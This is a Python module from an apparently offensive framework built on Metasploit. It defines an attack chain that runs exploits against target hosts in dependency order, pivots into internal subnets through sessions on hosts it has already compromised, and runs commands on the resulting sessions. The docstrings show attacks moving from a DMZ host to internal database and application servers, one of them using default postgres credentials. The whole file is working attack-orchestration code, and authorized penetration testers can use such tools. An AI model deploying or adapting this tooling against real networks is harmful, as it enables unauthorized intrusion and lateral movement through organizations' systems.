"""Chain module - Multi-stage attack orchestration with auto-pivoting.

Enables declarative multi-stage attacks where each stage can pivot
through previously compromised hosts to reach internal networks.

Example:
    >>> chain = hideout.chain()
    >>> chain.add("192.168.1.100", samba_weapon, name="dmz")
    >>> chain.add("10.0.0.50", postgres_weapon, via="dmz", name="db")
    >>> chain.add("10.0.0.51", ssh_weapon, via="db", name="app")
    >>>
    >>> results = chain.execute()
    >>> for name, kill in results.items():
    ...     print(f"{name}: {kill.interrogate('whoami')}")
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import TYPE_CHECKING, Any, Dict, List, Optional, Tuple, Union

import msf
from assassinate.log_config import get_logger

if TYPE_CHECKING:
    from assassinate.hideout import Hideout
    from assassinate.kill import Kill
    from assassinate.target import Target
    from assassinate.weapon import Weapon

logger = get_logger("chain")


@dataclass
class ChainStage:
    """A single stage in a multi-stage attack chain.

    Represents one hop in the attack path, potentially pivoting
    through a previous stage's session.

    Attributes:
        name: Unique identifier for this stage
        target: Target to attack (Target object or IP string)
        weapon: Weapon to use (Weapon object or module name)
        via: Name of stage to pivot through (optional)
        options: Weapon configuration options
        status: Current status (pending, executing, success, failed, skipped)
        kill: Resulting Kill if successful
        error: Error message if failed

    Example:
        >>> stage = ChainStage(
        ...     name="db_server",
        ...     target="10.0.0.50",
        ...     weapon="exploit/linux/postgres/...",
        ...     via="dmz"
        ... )
    """

    name: str
    target: Union["Target", str]
    weapon: Union["Weapon", str]
    via: Optional[str] = None
    options: Dict[str, Any] = field(default_factory=dict)
    status: str = "pending"
    kill: Optional["Kill"] = None
    error: Optional[str] = None

    def __repr__(self) -> str:
        target_str = self.target.host if hasattr(self.target, "host") else str(self.target)
        weapon_str = self.weapon.name if hasattr(self.weapon, "name") else str(self.weapon)
        parts = [f"<ChainStage {self.name}: {weapon_str} -> {target_str}"]
        if self.via:
            parts.append(f"via={self.via}")
        parts.append(f"[{self.status}]")
        return " ".join(parts) + ">"


class AttackChain:
    """Orchestrates multi-stage attacks with automatic pivoting.

    An AttackChain allows you to define complex attack paths declaratively.
    Each stage can optionally pivot through a previously compromised host,
    with the framework automatically setting up MSF routing.

    Key Features:
        - Declarative stage definition with `add()`
        - Automatic dependency resolution (topological sort)
        - Auto-pivoting via MSF routes
        - Parallel execution where possible
        - Graceful handling of failed stages

    Attributes:
        stages: List of ChainStage objects
        results: Dictionary mapping stage names to Kill objects

    Example:
        >>> # Define attack chain
        >>> chain = hideout.chain()
        >>> chain.add("192.168.1.100", "exploit/linux/samba/...", name="dmz")
        >>> chain.add("10.0.0.50", "exploit/linux/postgres/...", via="dmz", name="db")
        >>>
        >>> # Execute with auto-pivoting
        >>> results = chain.execute()
        >>> print(f"Got {len(results)} kills")
        >>>
        >>> # Clean up
        >>> chain.cleanup()
    """

    def __init__(self, hideout: "Hideout"):
        """Initialize an attack chain.

        Args:
            hideout: The Hideout instance to use for contract creation
        """
        self._hideout = hideout
        self._stages: List[ChainStage] = []
        self._routes_added: List[Tuple[str, str, int]] = []  # (subnet, netmask, session_id)
        self._results: Dict[str, "Kill"] = {}
        logger.debug("Attack chain initialized")

    def add(
        self,
        target: Union["Target", str],
        weapon: Union["Weapon", str],
        name: Optional[str] = None,
        via: Optional[str] = None,
        **options: Any,
    ) -> "AttackChain":
        """Add a stage to the attack chain.

        Args:
            target: Target to attack (Target object or IP string)
            weapon: Weapon to use (Weapon object or module name)
            name: Unique stage name (auto-generated if not provided)
            via: Name of stage to pivot through (optional)
            **options: Weapon configuration options

        Returns:
            self for method chaining

        Raises:
            ValueError: If stage name already exists or via references unknown stage

        Example:
            >>> chain.add("192.168.1.100", samba_weapon, name="initial")
            >>> chain.add("10.0.0.50", postgres_weapon, via="initial", name="db",
            ...           USERNAME="postgres", PASSWORD="postgres")
        """
        # Generate name if not provided
        if name is None:
            name = f"stage_{len(self._stages)}"

        # Validate name uniqueness
        existing_names = {s.name for s in self._stages}
        if name in existing_names:
            raise ValueError(f"Stage name '{name}' already exists")

        # Validate via reference
        if via is not None and via not in existing_names:
            raise ValueError(
                f"Stage '{name}' references unknown via stage '{via}'. "
                f"Available stages: {existing_names or 'none'}"
            )

        stage = ChainStage(
            name=name,
            target=target,
            weapon=weapon,
            via=via,
            options=options,
        )
        self._stages.append(stage)
        logger.debug(f"Added stage: {stage}")

        return self

    def _resolve_execution_order(self) -> List[ChainStage]:
        """Resolve stage execution order using topological sort.

        Stages that depend on others (via parameter) must execute after
        their dependencies. Independent stages can execute in parallel
        (handled externally).

        Returns:
            List of stages in valid execution order

        Raises:
            ValueError: If circular dependencies detected
        """
        # Build dependency graph
        name_to_stage = {s.name: s for s in self._stages}
        in_degree = {s.name: 0 for s in self._stages}
        dependents: Dict[str, List[str]] = {s.name: [] for s in self._stages}

        for stage in self._stages:
            if stage.via:
                in_degree[stage.name] += 1
                dependents[stage.via].append(stage.name)

        # Kahn's algorithm for topological sort
        queue = [name for name, degree in in_degree.items() if degree == 0]
        result = []

        while queue:
            name = queue.pop(0)
            result.append(name_to_stage[name])

            for dependent in dependents[name]:
                in_degree[dependent] -= 1
                if in_degree[dependent] == 0:
                    queue.append(dependent)

        if len(result) != len(self._stages):
            # Circular dependency detected
            remaining = [s.name for s in self._stages if s not in result]
            raise ValueError(f"Circular dependency detected in stages: {remaining}")

        logger.debug(f"Execution order: {[s.name for s in result]}")
        return result

    def _setup_pivot(self, via_kill: "Kill", target: Union["Target", str]) -> bool:
        """Set up pivot routing through a kill's session.

        Adds an MSF route so traffic to the target's network flows
        through the via_kill's session.

        Args:
            via_kill: Kill to pivot through
            target: Target being attacked (used to determine subnet)

        Returns:
            True if route was added successfully
        """
        # Extract target IP
        if hasattr(target, "host"):
            target_ip = target.host
        else:
            target_ip = str(target)

        # Determine subnet (simple /24 assumption)
        parts = target_ip.rsplit(".", 1)
        if len(parts) != 2:
            logger.error(f"Cannot determine subnet from IP: {target_ip}")
            return False

        subnet = f"{parts[0]}.0"
        netmask = "255.255.255.0"
        session_id = via_kill.id

        # Check if route already exists
        if msf.route_exists(subnet, netmask):
            logger.debug(f"Route to {subnet}/{netmask} already exists")
            return True

        try:
            success = msf.route_add(subnet, netmask, session_id)
            if success:
                self._routes_added.append((subnet, netmask, session_id))
                logger.info(f"Added pivot route: {subnet}/{netmask} via session {session_id}")
            else:
                logger.warning(f"Failed to add route to {subnet}/{netmask}")
            return success
        except Exception as e:
            logger.error(f"Error adding pivot route: {e}")
            return False

    def execute(
        self,
        timeout: int = 60,
        stop_on_failure: bool = False,
        profile_first: bool = True,
    ) -> Dict[str, "Kill"]:
        """Execute the attack chain.

        Runs each stage in dependency order, setting up pivots as needed.
        Stages that depend on failed stages are automatically skipped.

        Args:
            timeout: Seconds to wait for each exploit
            stop_on_failure: Stop entire chain if any stage fails
            profile_first: Run profile() before execute() for each stage

        Returns:
            Dictionary mapping stage names to successful Kill objects

        Example:
            >>> results = chain.execute(timeout=90, profile_first=True)
            >>> for name, kill in results.items():
            ...     print(f"{name}: {kill.host} - {kill.interrogate('hostname')}")
        """
        logger.info(f"Executing attack chain with {len(self._stages)} stages")
        self._results = {}

        try:
            execution_order = self._resolve_execution_order()
        except ValueError as e:
            logger.error(f"Cannot resolve execution order: {e}")
            return {}

        failed_stages: set = set()

        for stage in execution_order:
            logger.info(f"Executing stage: {stage.name}")
            stage.status = "executing"

            # Check if dependency failed
            if stage.via and stage.via in failed_stages:
                stage.status = "skipped"
                stage.error = f"Skipped due to failed dependency: {stage.via}"
                logger.warning(f"Stage {stage.name} skipped - dependency {stage.via} failed")
                failed_stages.add(stage.name)
                continue

            # Set up pivot if needed
            if stage.via:
                via_kill = self._results.get(stage.via)
                if via_kill:
                    if not self._setup_pivot(via_kill, stage.target):
                        logger.warning(f"Pivot setup failed for {stage.name}, proceeding anyway")
                else:
                    stage.status = "skipped"
                    stage.error = f"Via stage {stage.via} has no kill"
                    failed_stages.add(stage.name)
                    continue

            # Create and execute contract
            try:
                contract = self._hideout.contract(stage.target, stage.weapon)
                contract.configure(**stage.options)

                if profile_first:
                    if not contract.profile():
                        stage.status = "failed"
                        stage.error = "Profile check failed - target not vulnerable"
                        logger.warning(f"Stage {stage.name} profile failed")
                        failed_stages.add(stage.name)
                        if stop_on_failure:
                            break
                        continue

                kill = contract.execute(timeout)

                if kill:
                    stage.status = "success"
                    stage.kill = kill
                    self._results[stage.name] = kill
                    logger.success(f"Stage {stage.name} succeeded: {kill}")
                else:
                    stage.status = "failed"
                    stage.error = "Exploit returned no session"
                    failed_stages.add(stage.name)
                    logger.warning(f"Stage {stage.name} failed - no session")
                    if stop_on_failure:
                        break

            except Exception as e:
                stage.status = "failed"
                stage.error = str(e)
                failed_stages.add(stage.name)
                logger.error(f"Stage {stage.name} error: {e}")
                if stop_on_failure:
                    break

        # Summary
        success_count = len(self._results)
        fail_count = len(failed_stages)
        skip_count = sum(1 for s in self._stages if s.status == "skipped")

        logger.info(
            f"Chain execution complete: {success_count} success, "
            f"{fail_count} failed, {skip_count} skipped"
        )

        return self._results.copy()

    def cleanup(self, kill_sessions: bool = False) -> None:
        """Clean up routes and optionally sessions created by this chain.

        Args:
            kill_sessions: Also kill all sessions from this chain

        Example:
            >>> results = chain.execute()
            >>> # ... do post-exploitation ...
            >>> chain.cleanup(kill_sessions=True)
        """
        logger.info("Cleaning up attack chain")

        # Remove routes we added
        for subnet, netmask, session_id in self._routes_added:
            try:
                msf.route_remove(subnet, netmask, session_id)
                logger.debug(f"Removed route: {subnet}/{netmask} via {session_id}")
            except Exception as e:
                logger.warning(f"Failed to remove route {subnet}/{netmask}: {e}")

        self._routes_added.clear()

        # Optionally kill sessions
        if kill_sessions:
            for name, kill in self._results.items():
                try:
                    kill.silence()
                    logger.debug(f"Killed session from stage {name}")
                except Exception as e:
                    logger.warning(f"Failed to kill session from {name}: {e}")
            self._results.clear()

    # =========================================================================
    # Properties
    # =========================================================================

    @property
    def stages(self) -> List[ChainStage]:
        """Get all stages in the chain."""
        return self._stages.copy()

    @property
    def results(self) -> Dict[str, "Kill"]:
        """Get successful results (stage name -> Kill)."""
        return self._results.copy()

    @property
    def pending_stages(self) -> List[ChainStage]:
        """Get stages that haven't been executed yet."""
        return [s for s in self._stages if s.status == "pending"]

    @property
    def successful_stages(self) -> List[ChainStage]:
        """Get stages that succeeded."""
        return [s for s in self._stages if s.status == "success"]

    @property
    def failed_stages(self) -> List[ChainStage]:
        """Get stages that failed."""
        return [s for s in self._stages if s.status == "failed"]

    # =========================================================================
    # Display
    # =========================================================================

    def summary(self) -> str:
        """Get a text summary of the attack chain.

        Returns:
            Multi-line string with chain status
        """
        lines = [
            f"AttackChain: {len(self._stages)} stages",
            f"  Routes added: {len(self._routes_added)}",
            "",
        ]

        for stage in self._stages:
            target_str = stage.target.host if hasattr(stage.target, "host") else str(stage.target)
            weapon_str = stage.weapon.name if hasattr(stage.weapon, "name") else str(stage.weapon)

            status_icon = {
                "pending": "○",
                "executing": "◐",
                "success": "✓",
                "failed": "✗",
                "skipped": "⊘",
            }.get(stage.status, "?")

            line = f"  {status_icon} {stage.name}: {weapon_str} -> {target_str}"
            if stage.via:
                line += f" (via {stage.via})"
            if stage.error:
                line += f" [{stage.error}]"
            lines.append(line)

        return "\n".join(lines)

    def __repr__(self) -> str:
        success = len([s for s in self._stages if s.status == "success"])
        pending = len([s for s in self._stages if s.status == "pending"])
        return f"<AttackChain {len(self._stages)} stages: {success} success, {pending} pending>"

    def __len__(self) -> int:
        return len(self._stages)
